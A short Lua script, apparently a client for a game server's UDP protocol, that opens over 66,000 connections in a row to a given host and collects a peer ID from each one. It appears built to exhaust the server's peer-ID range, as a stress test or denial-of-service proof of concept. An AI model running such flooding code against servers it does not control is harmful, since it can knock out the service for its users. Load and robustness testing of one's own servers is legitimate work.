
local socket = require("socket")

local ClientServerPacket = require("packet/ClientServerPacket")
local ServerClientPacket = require("packet/ServerClientPacket")
local DumpPacket = require("packet/DumpPacket")

-- command line args
local server, port = ...

local function tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

print("Connecting to " .. server .. ":" .. port)
local udp

local function tx(def)
  print("TX: " .. DumpPacket(def))
  local data = ClientServerPacket.create(def)
  print(">> Sending:  " .. tohex(data) .. " len: " .. #data)
  udp:send(data)
end

for i=0,66000 do
	print(i)
	udp = socket.udp()
	udp:setpeername(server, tonumber(port))
	udp:settimeout(100)

	tx({
	  peer_id = 0,
	  channel = 0,
	  type = "reliable",
	  sequence_nr = 65500,
	  subtype = "original",
	  payload = string.char(0x00, 0x00)
	})

	local peer_id = 1
	local skip = false

	while not skip do
		local data = udp:receive()
		if data then
	    print("<< Received: " .. tohex(data) .. " len: " .. #data)
	    local packet = ServerClientPacket.parse(data)
	    print("RX: " .. DumpPacket(packet))

	    if packet.type == "reliable" then
	      -- send ack
	      tx({
	        peer_id = peer_id,
	        channel = 0,
	        type = "control",
	        sequence_nr = packet.sequence_nr,
	        ack = true
	      })
	    end

	    if packet.command == "SET_PEER_ID" then
	      peer_id = packet.payload.peer_id
	      print("Setting peer id to: " .. peer_id)
				skip = true
	    end

	  end
	end
end
